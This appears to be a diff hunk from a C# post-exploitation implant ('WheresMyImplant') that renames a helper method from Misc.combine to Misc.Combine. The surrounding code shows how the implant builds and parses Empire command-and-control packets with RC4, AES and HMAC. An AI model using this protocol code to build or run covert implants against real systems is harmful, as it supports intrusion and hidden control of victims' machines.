@@ -62,17 +62,17 @@ namespace WheresMyImplant
             }
 
             byte[] data = Encoding.ASCII.GetBytes(sessionId);
-            data = Misc.combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
-            data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
+            data = Misc.Combine(data, new byte[4] { 0x01, Convert.ToByte(meta), 0x00, 0x00 });
+            data = Misc.Combine(data, BitConverter.GetBytes(encryptedBytesLength));
 
             byte[] initializationVector = newInitializationVector(4);
-            byte[] rc4Key = Misc.combine(initializationVector, stagingKeyBytes);
+            byte[] rc4Key = Misc.Combine(initializationVector, stagingKeyBytes);
             byte[] routingPacketData = EmpireStager.rc4Encrypt(rc4Key, data);
 
-            routingPacketData = Misc.combine(initializationVector, routingPacketData);
+            routingPacketData = Misc.Combine(initializationVector, routingPacketData);
             if (encryptedBytes != null && encryptedBytes.Length > 0)
             {
-                routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
+                routingPacketData = Misc.Combine(routingPacketData, encryptedBytes);
             }
 
             return routingPacketData;
@@ -95,7 +95,7 @@ namespace WheresMyImplant
                 byte[] routingEncryptedData = packetData.Skip(4).Take(16).ToArray();
                 offset += 20;
 
-                byte[] rc4Key = Misc.combine(routingInitializationVector, stagingKeyBytes);
+                byte[] rc4Key = Misc.Combine(routingInitializationVector, stagingKeyBytes);
 
                 byte[] routingData = EmpireStager.rc4Encrypt(rc4Key, routingEncryptedData);
                 String packetSessionId = Encoding.UTF8.GetString(routingData.Take(8).ToArray());
@@ -176,12 +176,12 @@ namespace WheresMyImplant
                 ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
                 encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
             }
-            encryptedBytes = Misc.combine(ivBytes, encryptedBytes);
+            encryptedBytes = Misc.Combine(ivBytes, encryptedBytes);
 
             HMACSHA256 hmac = new HMACSHA256();
             hmac.Key = sessionKeyBytes;
             Byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
-            encryptedBytes = Misc.combine(encryptedBytes, hmacBytes);
+            encryptedBytes = Misc.Combine(encryptedBytes, hmacBytes);
 
             Byte[] routingPacket = newRoutingPacket(encryptedBytes, 5);
 
